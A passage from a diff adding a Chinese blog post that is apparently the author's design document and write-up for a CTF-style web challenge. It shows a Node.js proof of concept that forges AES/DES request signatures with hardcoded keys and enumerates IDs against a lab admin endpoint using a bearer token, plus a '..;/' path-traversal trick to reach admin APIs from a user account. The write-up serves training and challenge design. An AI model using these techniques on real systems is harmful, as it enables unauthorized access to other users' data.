<span class="keyword">return</span> desEncrypted;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>&#x20;         得到算法与 key 后，开始编写 poc，这⾥为了多点⼈做出来所以⽤户数据量很少，所以就很多⽅法，⽐如直接通过控制台去调这个函数，或者改返回包直接通过本地 js 去⾃动加密。</p>
+<p>&#x20;        编写 poc：nodejs 写的，因为算法稍微有点复杂，试了其他⼏个语⾔，⽤了同样的算法，可能是默认 iv 的事，有的加密出的数据不⼀样，需要微调下，这⾥图⽅便直接⽤ nodejs 写了：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">const</span> <span class="title class_">CryptoJS</span> = <span class="built_in">require</span>(<span class="string">&#x27;crypto-js&#x27;</span>)</span><br><span class="line">    <span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">&#x27;axios&#x27;</span>);</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">generateSign</span>(<span class="params">id</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> base64Encoded = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Base64</span>.<span class="title function_">stringify</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(id));</span><br><span class="line">        <span class="keyword">const</span> aesKey = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(<span class="string">&#x27;1234567890123456&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> aesEncrypted = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">encrypt</span>(base64Encoded, aesKey, &#123;</span><br><span class="line">                <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">ECB</span>,</span><br><span class="line">                <span class="attr">padding</span>: <span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">Pkcs7</span></span><br><span class="line">         &#125;).<span class="title function_">toString</span>();</span><br><span class="line">        <span class="keyword">const</span> hexEncoded = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Hex</span>.<span class="title function_">stringify</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Base64</span>.<span class="title function_">parse</span>(aesEncrypte</span><br><span class="line">d));</span><br><span class="line">        <span class="keyword">const</span> desKey = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(<span class="string">&#x27;12345678&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> desEncrypted = <span class="title class_">CryptoJS</span>.<span class="property">DES</span>.<span class="title function_">encrypt</span>(hexEncoded, desKey, &#123;</span><br><span class="line">                <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">ECB</span>,</span><br><span class="line">                <span class="attr">padding</span>: <span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">Pkcs7</span></span><br><span class="line">        &#125;).<span class="title function_">toString</span>();</span><br><span class="line">        <span class="keyword">return</span> desEncrypted</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">sendAllRequests</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> id = <span class="number">1</span>; id &lt;= <span class="number">30</span>; id++) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">await</span> <span class="title function_">sendRequest</span>(id);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">     <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`Error sending request for ID <span class="subst">$&#123;id&#125;</span>:`</span>, error);</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">sendRequest</span>(<span class="params">id</span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> sign = <span class="title function_">generateSign</span>(id);</span><br><span class="line">          <span class="keyword">const</span> payload = &#123;</span><br><span class="line">          <span class="attr">id</span>: id.<span class="title function_">toString</span>(),</span><br><span class="line">          <span class="attr">sign</span>: sign</span><br><span class="line">     &#125;;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> response = <span class="keyword">await</span> axios.<span class="title function_">post</span>(<span class="string">&#x27;http://192.168.238.250:8080/admin/select&#x27;</span>, p</span><br><span class="line">ayload, &#123;</span><br><span class="line">          <span class="attr">headers</span>: &#123;</span><br><span class="line">          <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;Authorization=Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiLlvKDkuI</span></span><br><span class="line"><span class="string">nkuowiLCJwaG9uZSI6IjE1MTQ5MDIyMTkyIiwiZXhwIjoxNzIzODI0NTY5fQ.c2tCjgtkFQ6IatQz-eOjt0TM1L</span></span><br><span class="line"><span class="string">foH6L7EkuZb1XMl1Q&#x27;</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Response for ID <span class="subst">$&#123;id&#125;</span>:`</span>, response.<span class="property">data</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line"><span class="title function_">sendAllRequests</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>成功拿到 flag:</p>
+<p><img src="/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/image_0_73_VS2HP.png"></p>
+<h3 id="思路-2-xA-x20"><a href="#思路-2-xA-x20" class="headerlink" title="思路-2&#xA;     &#x20;"></a>思路-2&#xA;     &#x20;</h3><p>&#x20;        普通⽤户注册登录，然后利⽤&#x2F;user&#x2F;select&#x2F;..;&#x2F;..;&#x2F;admin&#x2F;select，越权到&#x2F;admin&#x2F;select 接⼝<br>&#x2F;admin&#x2F;select 接⼝与&#x2F;admin&#x2F;register 权限设置不⼀样，&#x2F;admin&#x2F;register 可⽆权限—&gt;admin 权限<br>但&#x2F;admin&#x2F;select 接⼝只能 user 权限—&gt;admin 权限，剩下同上</p>
+<p>&#x20;       这道题是之前挖 src 的时候实际碰⻅的⼀种情况，差不多⼀⽐⼀的复刻了下，逻辑漏洞的表现形式：⼤家对于 java 框架中想到绕过鉴权的时候⼤部分都是⽆权限→⾼权限，不怎么关注低权限→⾼权限</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">1.</span> <span class="toc-text">解题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="toc-number">1.1.</span> <span class="toc-text">思路-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-2-xA-x20"><span class="toc-number">1.2.</span> <span class="toc-text">思路-2
+      </span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/&text=移动大比武某web题出题文档与wp—从实战出发"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/&title=移动大比武某web题出题文档与wp—从实战出发"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/&is_video=false&description=移动大比武某web题出题文档与wp—从实战出发"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=移动大比武某web题出题文档与wp—从实战出发&body=Check out this article: http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/&title=移动大比武某web题出题文档与wp—从实战出发"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/&title=移动大比武某web题出题文档与wp—从实战出发"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/&title=移动大比武某web题出题文档与wp—从实战出发"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/&title=移动大比武某web题出题文档与wp—从实战出发"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/&name=移动大比武某web题出题文档与wp—从实战出发&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/03/20/%E7%A7%BB%E5%8A%A8%E5%A4%A7%E6%AF%94%E6%AD%A6%E6%9F%90web%E9%A2%98%E5%87%BA%E9%A2%98%E6%96%87%E6%A1%A3%E4%B8%8Ewp%E2%80%94%E4%BB%8E%E5%AE%9E%E6%88%98%E5%87%BA%E5%8F%91/&t=移动大比武某web题出题文档与wp—从实战出发"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    wa1ki0g
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
